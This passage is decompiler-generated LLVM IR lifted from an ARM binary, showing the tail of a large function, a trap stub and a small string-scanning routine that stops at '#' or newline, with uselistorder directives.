  store i32 %v4_16bc4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_16bcc = inttoptr i32 %v1_16b98 to i8*
  %v3_16bcc = load i8, i8* %v2_16bcc, align 1
  %v4_16bcc = zext i8 %v3_16bcc to i32
  store i32 %v4_16bcc, i32* %ip.global-to-local, align 4
  %v1_16bd0 = add i32 %v2_16b94, 1
  %v2_16bd0 = inttoptr i32 %v1_16bd0 to i8*
  %v3_16bd0 = load i8, i8* %v2_16bd0, align 1
  %v4_16bd0 = zext i8 %v3_16bd0 to i32
  %v4_16bd4 = mul nuw nsw i32 %v4_16ba8, 256
  %v5_16bd4 = or i32 %v4_16bb8, %v4_16bd4
  store i32 %v5_16bd4, i32* @r6, align 4
  store i32 %v4_16ba0, i32* @r7, align 4
  %v4_16bdc = mul nuw nsw i32 %v6_16bc0, 256
  %v5_16bdc = or i32 %v4_16bd0, %v4_16bdc
  store i32 %v5_16bdc, i32* @lr, align 4
  %v4_16be0 = mul nuw nsw i32 %v4_16bcc, 256
  %v5_16be0 = or i32 %v4_16be0, %v4_16bc4
  store i32 %v5_16be0, i32* %r3.global-to-local, align 4
  store i32 %v2_16b74, i32* @r5, align 4
  store i32 %v4_16bb4, i32* @ip, align 4
  %v1_16bf4 = add i32 %v2_16b94, 10
  store i32 %v1_16bf4, i32* %r1.global-to-local, align 4
  %v1_16bf8 = add i32 %v2_16b90, 10
  store i32 %v1_16bf8, i32* @r4, align 4
  %v2_16bfc = sub i32 %v2_16b74, %v5_16bd4
  %v3_16bfc = icmp uge i32 %v2_16b74, %v5_16bd4
  store i1 %v3_16bfc, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_16bfc
  %v6_16bfc = and i32 %v2_16b74, %tmp226
  %v7_16bfc = icmp slt i32 %v6_16bfc, 0
  %v8_16bfc = icmp slt i32 %v2_16bfc, 0
  store i32 %v1_16b88, i32* %stack_var_-144, align 4
  %v2_16c1c = xor i1 %v8_16bfc, %v7_16bfc
  br i1 %v2_16c1c, label %dec_label_pc_16c2c, label %dec_label_pc_16c24

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16b84
  %v0_16c20 = load i32, i32* @sb, align 4
  %v2_16c20 = add i32 %v0_16c20, %v5_16bd4
  store i32 %v2_16c20, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16c24 = icmp slt i32 %v2_16c20, 0
  br i1 %v1_16c24, label %dec_label_pc_16c2c, label %dec_label_pc_16c48

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16c24, %dec_label_pc_16b84, %dec_label_pc_16b40, %dec_label_pc_16c24.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c30 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_16c30, label %dec_label_pc_16d98, label %dec_label_pc_16c38

dec_label_pc_16c38:                               ; preds = %dec_label_pc_16c2c
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16c3c, label %dec_label_pc_16d98, label %dec_label_pc_16d70

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c24
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c4c = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_16c4c, label %dec_label_pc_16cf0, label %dec_label_pc_16c54

dec_label_pc_16c54:                               ; preds = %dec_label_pc_16c48
  %v0_16c54 = load i32, i32* @fp, align 4
  %v1_16c54 = add i32 %v0_16c54, 28
  store i32 %v1_16c54, i32* %r3.global-to-local, align 4
  %v1_16c58 = inttoptr i32 %v1_16c54 to i32*
  %v2_16c58 = load i32, i32* %v1_16c58, align 4
  store i32 %v2_16c58, i32* @r3, align 4
  %v3_16c58 = add i32 %v0_16c54, 32
  %v4_16c58 = inttoptr i32 %v3_16c58 to i32*
  %v5_16c58 = load i32, i32* %v4_16c58, align 4
  store i32 %v5_16c58, i32* @ip, align 4
  %v6_16c58 = add i32 %v0_16c54, 36
  %v7_16c58 = inttoptr i32 %v6_16c58 to i32*
  %v8_16c58 = load i32, i32* %v7_16c58, align 4
  store i32 %v8_16c58, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_16c54, i32* @r0, align 4
  store i32 %v2_16b28, i32* @r1, align 4
  %v0_16c74 = call i32 @function_f700()
  %v0_16c78 = load i32, i32* @fp, align 4
  %v1_16c78 = add i32 %v0_16c78, 4
  %v2_16c78 = inttoptr i32 %v1_16c78 to i32*
  %v3_16c78 = load i32, i32* %v2_16c78, align 4
  %v2_16c7c = icmp ugt i32 %v3_16c78, 23
  store i1 %v2_16c7c, i1* %cpsr_c.global-to-local, align 1
  %v7_16c7c = icmp eq i32 %v3_16c78, 24
  br i1 %v7_16c7c, label %dec_label_pc_16ca0, label %dec_label_pc_16c84

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c54
  %v1_16c84 = add i32 %v0_16c78, 28
  %v2_16c84 = inttoptr i32 %v1_16c84 to i32*
  %v3_16c84 = load i32, i32* %v2_16c84, align 4
  store i32 %v3_16c84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c88 = icmp eq i32 %v3_16c84, 0
  br i1 %v2_16c88, label %dec_label_pc_16d70, label %dec_label_pc_16c90

dec_label_pc_16c90:                               ; preds = %dec_label_pc_16c84
  store i1 %v2_16c94, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16c94, label %dec_label_pc_16ca0, label %bb227

bb227:                                            ; preds = %dec_label_pc_16c90
  store i1 %v3_16c98, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_16c98, label %dec_label_pc_16ca0, label %dec_label_pc_16d70

dec_label_pc_16ca0:                               ; preds = %dec_label_pc_16c90, %bb227, %dec_label_pc_16c54
  store i32 %v0_16678, i32* %r1.global-to-local, align 4
  %v3_16ca4 = icmp uge i32 %v3_16c78, %v0_16678
  store i1 %v3_16ca4, i1* %cpsr_c.global-to-local, align 1
  %v9_16ca4 = icmp eq i32 %v3_16c78, %v0_16678
  br i1 %v9_16ca4, label %dec_label_pc_16cb4, label %bb228

bb228:                                            ; preds = %dec_label_pc_16ca0
  br label %dec_label_pc_16d48

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16ca0
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_16cbc = add i32 %v0_16c78, 16
  %v2_16cbc = inttoptr i32 %v1_16cbc to i32*
  %v3_16cbc = load i32, i32* %v2_16cbc, align 4
  %v2_16cc0 = sub i32 %tmp159, %stack_var_-452.061
  %v1_16cc4 = add i32 %v2_16cc0, -1
  store i32 %v1_16cc4, i32* %r3.global-to-local, align 4
  %v1_16cc8 = add i32 %v3_16cbc, 4
  %v2_16ccc = mul i32 %v1_16cc8, %v1_16cc4
  store i32 %v2_16ccc, i32* %r1.global-to-local, align 4
  %v1_16cd0 = add i32 %v0_16c78, 32
  %v2_16cd0 = inttoptr i32 %v1_16cd0 to i32*
  %v3_16cd0 = load i32, i32* %v2_16cd0, align 4
  %v3_16cd4 = icmp uge i32 %v2_16ccc, %v3_16cd0
  store i1 %v3_16cd4, i1* %cpsr_c.global-to-local, align 1
  %v2_16cd8 = add i32 %v0_16c78, 36
  %v3_16cd8 = inttoptr i32 %v2_16cd8 to i32*
  store i32 %v1_16cc4, i32* %v3_16cd8, align 4
  %tmp286 = icmp ugt i32 %v2_16ccc, %v3_16cd0
  br i1 %tmp286, label %dec_label_pc_16d70, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cb4
  store i32 0, i32* @r7, align 4
  %v1_16ce8 = load i32, i32* @fp, align 4
  %v2_16ce8 = add i32 %v1_16ce8, 36
  %v3_16ce8 = inttoptr i32 %v2_16ce8 to i32*
  store i32 0, i32* %v3_16ce8, align 4
  br label %dec_label_pc_16d48

dec_label_pc_16cf0:                               ; preds = %dec_label_pc_16c48
  store i32 %v1_16b88, i32* @r0, align 4
  %v0_16cf4 = call i32 @function_11048()
  store i32 %v5_16bdc, i32* %r3.global-to-local, align 4
  store i32 %v0_16678, i32* @ip, align 4
  %v3_16d00 = icmp uge i32 %v5_16bdc, %v0_16678
  store i1 %v3_16d00, i1* %cpsr_c.global-to-local, align 1
  %v9_16d00 = icmp eq i32 %v5_16bdc, %v0_16678
  br i1 %v9_16d00, label %dec_label_pc_16d08, label %dec_label_pc_16d48

dec_label_pc_16d08:                               ; preds = %dec_label_pc_16cf0
  %v0_16d08 = load i32, i32* @fp, align 4
  %v1_16d08 = add i32 %v0_16d08, 16
  %v2_16d08 = inttoptr i32 %v1_16d08 to i32*
  %v3_16d08 = load i32, i32* %v2_16d08, align 4
  store i32 %v3_16d08, i32* %r1.global-to-local, align 4
  store i32 %v5_16bd4, i32* %r3.global-to-local, align 4
  %v3_16d10 = icmp uge i32 %v3_16d08, %v5_16bd4
  store i1 %v3_16d10, i1* %cpsr_c.global-to-local, align 1
  %v9_16d10 = icmp eq i32 %v3_16d08, %v5_16bd4
  br i1 %v9_16d10, label %dec_label_pc_16d24, label %dec_label_pc_16d18

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16d08
  %v1_16d18 = inttoptr i32 %v0_16d08 to i32*
  %v2_16d18 = load i32, i32* %v1_16d18, align 4
  store i32 %v2_16d18, i32* @r0, align 4
  %v0_16d1c = call i32 @function_11048()
  br label %dec_label_pc_16d98

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d08
  %v1_16d24 = add i32 %v0_16d08, 36
  %v2_16d24 = inttoptr i32 %v1_16d24 to i32*
  %v3_16d24 = load i32, i32* %v2_16d24, align 4
  %v1_16d28 = add i32 %v0_16d08, 28
  %v2_16d28 = inttoptr i32 %v1_16d28 to i32*
  %v3_16d28 = load i32, i32* %v2_16d28, align 4
  store i32 %v3_16d28, i32* @r3, align 4
  %v3_16d2c = mul i32 %v3_16d24, %v5_16bd4
  %v4_16d2c = add i32 %v3_16d28, %v3_16d2c
  store i32 %v4_16d2c, i32* @r0, align 4
  store i32 %v5_16bd4, i32* @r2, align 4
  store i32 %v1_16bf4, i32* @r1, align 4
  %v0_16d38 = call i32 @function_f700()
  %v0_16d3c = load i32, i32* @fp, align 4
  %v1_16d3c = add i32 %v0_16d3c, 36
  %v2_16d3c = inttoptr i32 %v1_16d3c to i32*
  %v3_16d3c = load i32, i32* %v2_16d3c, align 4
  %v1_16d40 = add i32 %v3_16d3c, 1
  store i32 %v1_16d40, i32* %r3.global-to-local, align 4
  store i32 %v1_16d40, i32* %v2_16d3c, align 4
  br label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %bb228, %dec_label_pc_16cf0, %dec_label_pc_16ce0, %dec_label_pc_16d24
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_16d24 ], [ 0, %dec_label_pc_16cf0 ], [ 0, %dec_label_pc_16ce0 ], [ 1, %bb228 ]
  %v1_16d50 = load i32, i32* @r4, align 4
  %v1_16d54 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_16d54, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_16d68 = icmp uge i32 %v1_16d54, %tmp159
  store i1 %v3_16d68, i1* %cpsr_c.global-to-local, align 1
  %v5_16d6c = icmp slt i32 %v1_16d54, %tmp159
  br i1 %v5_16d6c, label %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge, label %dec_label_pc_16d70

dec_label_pc_16d48.dec_label_pc_16b40_crit_edge:  ; preds = %dec_label_pc_16d48
  %v2_16d50 = add i32 %v1_16d50, %stack_var_-460.364
  %v0_16b44.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16b40

dec_label_pc_16d70:                               ; preds = %dec_label_pc_16c38, %dec_label_pc_16b1c, %dec_label_pc_16d48, %dec_label_pc_16c84, %dec_label_pc_16cb4, %bb227
  %v1_16d74 = call i32 @function_d088(i32 %v3_16948)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d7c = icmp eq i32 %arg3, 0
  br i1 %v2_16d7c, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_16d70
  %v1_16d84 = load i32, i32* @sl, align 4
  %v3_16d80 = inttoptr i32 %arg3 to i32*
  store i32 %v1_16d84, i32* %v3_16d80, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_16d70
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_16d8c.677 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16d7c, i32 ptrtoint (i32* @global_var_11048.271 to i32))
  store i32 %v1_166c0, i32* @r0, align 4
  %v0_16d90 = call i32 @function_11048()
  br label %dec_label_pc_16e00

dec_label_pc_16d98:                               ; preds = %thread-pre-split, %dec_label_pc_16994, %dec_label_pc_16af4, %dec_label_pc_16aec, %dec_label_pc_16a9c, %dec_label_pc_16aa8, %dec_label_pc_16ab4thread-pre-split, %thread-pre-split.thread, %dec_label_pc_16a6c, %dec_label_pc_16c38, %dec_label_pc_16c2c, %dec_label_pc_16958, %dec_label_pc_16938, %dec_label_pc_16d18
  %v1_16d9c = add i32 %v0_1685c, 1
  store i32 %v1_16d9c, i32* @r5, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %.thread7, %dec_label_pc_16d98
  %storemerge22 = phi i32 [ -1, %dec_label_pc_16d98 ], [ %v7_16a58, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_16d9c, %dec_label_pc_16d98 ], [ %v0_1685c, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_16dac = add i32 %stack_var_-476.1, -1
  store i32 %v1_16dac, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_16dac, 1
  br i1 %tmp232, label %dec_label_pc_16dc8, label %dec_label_pc_16760

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_1690c, %bb218, %bb213, %.thread5, %dec_label_pc_166dc
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_16dc8

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16da8, %.thread132, %dec_label_pc_16dc0
  %stack_var_-472.1 = phi i32 [ %v1_166c0, %dec_label_pc_16dc0 ], [ 0, %.thread132 ], [ %v1_166c0, %dec_label_pc_16da8 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_16dc0 ], [ -1, %.thread132 ], [ %v3_16948, %dec_label_pc_16da8 ]
  %v0_16dc8 = call i32 @function_1331c()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16dd4 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_16dd4, i1* %cpsr_c.global-to-local, align 1
  %v7_16dd4 = icmp eq i32 %stack_var_-488.2, -1
  %v2_16dd8 = inttoptr i32 %v0_16dc8 to i32*
  store i32 -1, i32* %v2_16dd8, align 4
  br i1 %v7_16dd4, label %dec_label_pc_16de8, label %dec_label_pc_16de0

dec_label_pc_16de0:                               ; preds = %dec_label_pc_16dc8, %dec_label_pc_16a94
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16dc8 ], [ %v1_166c0, %dec_label_pc_16a94 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_16dc8 ], [ %v3_16948, %dec_label_pc_16a94 ]
  %v1_16de4 = call i32 @function_d088(i32 %stack_var_-488.3)
  br label %dec_label_pc_16de8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16dc8, %dec_label_pc_16de0
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16dc8 ], [ %stack_var_-472.2, %dec_label_pc_16de0 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_16dec = call i32 @function_11048()
  %v0_16df0 = load i32, i32* @sl, align 4
  store i32 %v0_16df0, i32* @r0, align 4
  %v0_16df4 = call i32 @function_11048()
  br label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %bb231, %dec_label_pc_16de8
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_16de8 ], [ %v4_169d0, %bb231 ]
  store i32 %v3_16664, i32* @r4, align 4
  store i32 %v6_16664, i32* @r5, align 4
  store i32 %v9_16664, i32* @r6, align 4
  store i32 %v12_16664, i32* @r7, align 4
  store i32 %v15_16664, i32* @r8, align 4
  store i32 %v18_16664, i32* @sb, align 4
  store i32 %v21_16664, i32* @sl, align 4
  store i32 %v24_16664, i32* @fp, align 4
  store i32 %v27_16664, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_16dac, { 1, 2, 0 }
  uselistorder i32 %v1_16d54, { 1, 2, 3, 0 }
  uselistorder i32 %v0_16d08, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16cc4, { 1, 0, 2 }
  uselistorder i32 %v2_16bfc, { 1, 0 }
  uselistorder i32 %v5_16bd4, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_16b94, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_16b90, { 1, 0 }
  uselistorder i32 %v2_16b74, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_16b70, { 1, 0 }
  uselistorder i32 %v1_16b6c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_16aec, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_16ac8, { 1, 0 }
  uselistorder i32 %v3_16abc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16abc, { 0, 2, 1 }
  uselistorder i32 %v2_16aac, { 0, 2, 1 }
  uselistorder i1 %v7_169e0, { 1, 0 }
  uselistorder i32 %v1_169e0, { 1, 0 }
  uselistorder i32 %v0_169e0, { 1, 0 }
  uselistorder i32 %v4_169d0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_16948, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_16900, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1688c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_16874, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_16868, { 1, 0 }
  uselistorder i32 %v0_1685c, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i1 %v7_16764, { 1, 0 }
  uselistorder i32 %v1_16768, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_16b24, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16a34, { 2, 0, 1 }
  uselistorder i32 %v2_168bc, { 1, 0, 2 }
  uselistorder i32 %v2_16894, { 1, 0 }
  uselistorder i32 %v0_166dc, { 1, 0, 2 }
  uselistorder i32 %v1_166c0, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v0_1668c, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_16678, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 19, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 52, 20, 21, 51, 1, 22, 23, 24, 25, 26, 27, 28, 16, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 27, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 20, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 55, 18, 19, 53, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 54, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32)* @function_d088, { 5, 4, 15, 14, 13, 12, 11, 10, 0, 17, 16, 9, 8, 7, 6, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1656c, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 5, 4 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ()* @function_1331c, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_ff88, { 3, 4, 0, 2, 1 }
  uselistorder i32 64, { 2, 5, 0, 8, 6, 4, 12, 1, 3, 9, 10, 7, 11 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_ff1c, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10044, { 2, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 2, 4, 1, 6, 5, 3, 0 }
  uselistorder i32 76, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5, 6, 7 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5 }
  uselistorder i32 10756, { 1, 0, 2 }
  uselistorder i32 512, { 3, 5, 2, 6, 1, 7, 8, 9, 10, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16e00, { 1, 0 }
  uselistorder label %dec_label_pc_16de8, { 1, 0 }
  uselistorder label %dec_label_pc_16dc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16dc0, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_16da8, { 1, 0 }
  uselistorder label %dec_label_pc_16d98, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_16d70, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_16d48, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_16ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16c2c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_16b40, { 1, 0 }
  uselistorder label %dec_label_pc_16aec, { 1, 0 }
  uselistorder label %dec_label_pc_16abc, { 1, 0 }
  uselistorder label %dec_label_pc_16a94, { 1, 0 }
  uselistorder label %dec_label_pc_169e0, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1683c, { 1, 0 }
  uselistorder label %dec_label_pc_16800, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @function_16e10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16e10:
  %v0_16e10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e10, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_16e10
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_16e10, %bb
  %v7_16e48 = phi i32 [ %arg1, %dec_label_pc_16e10 ], [ 0, %bb ]
  ret i32 %v7_16e48

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @function_16e4c() local_unnamed_addr {
dec_label_pc_16e4c:
  store i32 920, i32* @lr, align 4
  store i32 142964, i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @function_16ea0(i8* %arg1) local_unnamed_addr {
dec_label_pc_16ea0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16ea4 = load i32, i32* @r4, align 4
  store i32 %v3_16ea4, i32* %stack_var_-8, align 4
  store i32 142964, i32* @ip, align 4
  store i32 920, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_16eb4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16eb49 = inttoptr i32 %v0_16eb4.pre to i8*
  %v2_16eb410 = load i8, i8* %v1_16eb49, align 1
  %v2_16eb812 = icmp eq i8 %v2_16eb410, 0
  store i1 %v2_16eb812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16eb812, label %dec_label_pc_16ee8, label %dec_label_pc_16ec4

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16ea0, %bb8.dec_label_pc_16ec4_crit_edge
  %v1_16ec4 = phi i32 [ %v1_16ec4.pre, %bb8.dec_label_pc_16ec4_crit_edge ], [ 920, %dec_label_pc_16ea0 ]
  %v0_16ec4 = phi i32 [ %v0_16ec4.pre, %bb8.dec_label_pc_16ec4_crit_edge ], [ 142964, %dec_label_pc_16ea0 ]
  %v2_16eb416 = phi i8 [ %v2_16eb4, %bb8.dec_label_pc_16ec4_crit_edge ], [ %v2_16eb410, %dec_label_pc_16ea0 ]
  %v2_16ebc17.in.in = phi i8 [ %v2_16eb4, %bb8.dec_label_pc_16ec4_crit_edge ], [ %v2_16eb410, %dec_label_pc_16ea0 ]
  %v1_16eb415 = phi i8* [ %v1_16eb4, %bb8.dec_label_pc_16ec4_crit_edge ], [ %v1_16eb49, %dec_label_pc_16ea0 ]
  %v2_16edc14 = phi i32 [ %v2_16ee0, %bb8.dec_label_pc_16ec4_crit_edge ], [ %v0_16eb4.pre, %dec_label_pc_16ea0 ]
  %v2_16ebc17.in = zext i8 %v2_16ebc17.in.in to i32
  %v2_16ebc17 = mul nuw nsw i32 %v2_16ebc17.in, 2
  %v2_16ec4 = add i32 %v1_16ec4, %v0_16ec4
  %v3_16ec4 = inttoptr i32 %v2_16ec4 to i32*
  %v4_16ec4 = load i32, i32* %v3_16ec4, align 4
  %v2_16ec8 = add i32 %v4_16ec4, %v2_16ebc17
  %v3_16ec8 = inttoptr i32 %v2_16ec8 to i16*
  %v4_16ec8 = load i16, i16* %v3_16ec8, align 2
  %v1_16ecc = and i16 %v4_16ec8, 32
  %v2_16ecc = icmp eq i16 %v1_16ecc, 0
  store i1 %v2_16ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ecc, label %dec_label_pc_16ee8, label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16ec4
  %v7_16ed4 = icmp eq i8 %v2_16eb416, 35
  br i1 %v7_16ed4, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_16ed4
  %v8_16ed8 = icmp eq i8 %v2_16eb416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_16ed4, %bb
  %storemerge = phi i1 [ %v8_16ed8, %bb ], [ %v7_16ed4, %dec_label_pc_16ed4 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_16edc = load i32, i32* %lr.global-to-local, align 4
  %v1_16edc = trunc i32 %v0_16edc to i8
  store i8 %v1_16edc, i8* %v1_16eb415, align 1
  %v0_16ee0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_16eec.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_16ee0, label %dec_label_pc_16ee8, label %bb8

bb8:                                              ; preds = %bb7
  %v2_16ee0 = add i32 %v1_16eec.pre, 1
  store i32 %v2_16ee0, i32* %r0.global-to-local, align 4
  %v1_16eb4 = inttoptr i32 %v2_16ee0 to i8*
  %v2_16eb4 = load i8, i8* %v1_16eb4, align 1
  %v2_16eb8 = icmp eq i8 %v2_16eb4, 0
  store i1 %v2_16eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16eb8, label %dec_label_pc_16ee8, label %bb8.dec_label_pc_16ec4_crit_edge

bb8.dec_label_pc_16ec4_crit_edge:                 ; preds = %bb8
  %v0_16ec4.pre = load i32, i32* @ip, align 4
  %v1_16ec4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16ec4

dec_label_pc_16ee8:                               ; preds = %bb8, %dec_label_pc_16ec4, %bb7, %dec_label_pc_16ea0
  %v1_16eec = phi i32 [ %v0_16eb4.pre, %dec_label_pc_16ea0 ], [ %v1_16eec.pre, %bb7 ], [ %v2_16edc14, %dec_label_pc_16ec4 ], [ %v2_16ee0, %bb8 ]
  %v2_16ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16ee8, i32* @r4, align 4
  ret i32 %v1_16eec

; uselistorder directives
  uselistorder i8 %v2_16eb4, { 2, 1, 0 }
